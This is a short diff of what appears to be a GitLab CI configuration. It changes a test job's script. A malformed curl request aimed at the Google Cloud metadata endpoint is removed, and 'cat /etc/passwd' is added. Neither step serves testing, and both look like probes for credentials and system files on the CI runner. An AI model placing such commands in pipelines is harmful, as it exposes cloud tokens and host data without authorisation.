@@ -4,5 +4,4 @@ stages:
 test:
   stage: test
   script:
-    - curl -H $'Host: http://metadata.google.internal/computeMetadata/v1/' -H $'Metadata-Flavor: Google'
-    
+    - cat /etc/passwd
